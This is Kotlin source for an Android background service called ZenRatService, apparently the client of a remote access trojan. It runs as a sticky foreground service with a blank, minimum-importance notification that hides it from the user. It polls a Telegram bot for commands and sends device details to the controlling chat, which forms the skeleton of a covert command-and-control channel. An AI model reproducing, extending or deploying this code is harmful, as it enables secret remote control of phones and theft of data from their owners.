package com.zenrat.client.core

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import io.ktor.client.*
import io.ktor.client.call.*
import io.ktor.client.engine.cio.*
import io.ktor.client.plugins.contentnegotiation.*
import io.ktor.client.request.*
import io.ktor.serialization.kotlinx.json.*
import kotlinx.coroutines.*
import kotlinx.serialization.json.Json

class ZenRatService : Service() {

    private val job = Job()
    private val scope = CoroutineScope(Dispatchers.IO + job)

    private val client by lazy {
        HttpClient(CIO) {
            install(ContentNegotiation) {
                json(Json {
                    ignoreUnknownKeys = true
                    isLenient = true
                })
            }
        }
    }

    private var lastUpdateId = 0L

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service is starting...")

        startForeground(NOTIFICATION_ID, createNotification())

        scope.launch {
            pollTelegramUpdates()
        }
        return START_STICKY
    }

    private fun createNotification(): android.app.Notification {
        val channelId = "ZenRatServiceChannel"
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val channel = android.app.NotificationChannel(
                channelId,
                "ZenRat Service",
                android.app.NotificationManager.IMPORTANCE_MIN
            )
            val manager = getSystemService(android.content.Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
            manager.createNotificationChannel(channel)
        }

        return androidx.core.app.NotificationCompat.Builder(this, channelId)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_upload) // A generic system icon
            .build()
    }

    private suspend fun pollTelegramUpdates() {
        while (isActive) {
            try {
                val response: ApiResponse<List<Update>> = client.get("$TELEGRAM_API_URL$BOT_TOKEN_PLACEHOLDER/getUpdates") {
                    parameter("offset", lastUpdateId + 1)
                    parameter("timeout", 30) // Long polling timeout
                }.body()

                if (response.ok && response.result.isNotEmpty()) {
                    response.result.forEach { update ->
                        lastUpdateId = update.updateId
                        update.message?.let { message ->
                            Log.d(TAG, "Received message: ${message.text} from chat ${message.chat.id}")
                            handleCommand(message)
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error polling updates", e)
                // Wait before retrying to avoid spamming in case of network errors
                delay(5000)
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Service is being destroyed.")
        job.cancel()
    }

    private suspend fun handleCommand(message: Message) {
        when (message.text) {
            "/start" -> {
                sendMessage(message.chat.id, "Device is online.")
            }
            "/deviceinfo" -> {
                val deviceInfo = getDeviceInfo()
                sendMessage(message.chat.id, deviceInfo)
            }
        }
    }

    private fun getDeviceInfo(): String {
        val batteryManager = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
        val batteryLevel = batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)

        return """
            Device Information:
            Model: ${android.os.Build.MODEL}
            Manufacturer: ${android.os.Build.MANUFACTURER}
            Android Version: ${android.os.Build.VERSION.RELEASE} (API ${android.os.Build.VERSION.SDK_INT})
            Battery: $batteryLevel%
        """.trimIndent()
    }

    private suspend fun sendMessage(chatId: Long, text: String) {
        try {
            client.post("$TELEGRAM_API_URL$BOT_TOKEN_PLACEHOLDER/sendMessage") {
                parameter("chat_id", chatId)
                parameter("text", text)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error sending message", e)
        }
    }

    companion object {
        private const val TAG = "ZenRatService"
        private const val NOTIFICATION_ID = 1337
    }
}
